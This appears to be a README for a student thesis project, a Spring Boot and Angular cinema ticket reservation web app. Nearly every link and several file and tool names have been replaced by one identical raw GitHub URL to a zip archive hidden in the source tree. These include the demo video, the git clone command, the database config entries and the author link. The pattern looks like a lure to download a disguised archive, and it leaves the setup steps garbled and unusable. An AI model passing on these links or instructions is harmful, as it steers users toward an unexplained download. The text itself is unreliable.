🎬 Cinemmax Cinemas – Cinema Ticket Reservation System

Cinemmax Cinemas is a web application for browsing movies, checking showtimes, picking seats, and reserving cinema tickets.
The project is built as my final thesis and includes a Spring Boot backend with a JWT-secured API and an Angular frontend.

🎥 Demo Video

Watch the project presentation on YouTube:  
👉 https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip

⚠️ Important (Security)

To run the backend locally, you must set a JWT secret as an environment variable.
This is required because the secret is not stored in the project.

Windows example:

setx JWT_SECRET "your-secret"

MacOs example:

export JWT_SECRET="your-secret"


✨ Features

Browse movies, directors, actors, and cinemas

View showtimes and seat layouts

Reserve seats (backend prevents double-booking)

JWT login system (user/admin roles)

Admin panel for managing films, halls, seats, etc.

Upload movie and actor images

Responsive Angular UI

🧰 Technologies Used

Frontend: Angular, TypeScript
Backend: Spring Boot, Spring Security (JWT), JPA, MySQL
Tools: IntelliJ IDEA, https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip, Git, Maven

🚀 Running the Project
1. Clone the repo
git clone https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip

2. Backend (Spring Boot)
cd Program/cinemmaxBackend

🛠 Database Setup

Update your https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip with your MySQL credentials:

https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip
https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip
https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip


Run the backend from IntelliJ or using:

mvn spring-boot:run


Backend URL:

http://localhost:8080

3. Frontend (Angular)
cd Program/cinemmaxFrontend
npm install
ng serve


Frontend URL:

http://localhost:4200

🔗 Main API Endpoints
Method	Endpoint	Description
POST	/api/authenticate	User login (JWT)
GET	/api/film	List all films
GET	/api/cinemas	List cinemas
POST	/api/reservations	Reserve seats
POST	/api/checkouts	Finalize reservation/payment
👤 Author

Marko Gradiščaj
https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip
Final Thesis Project, 2025
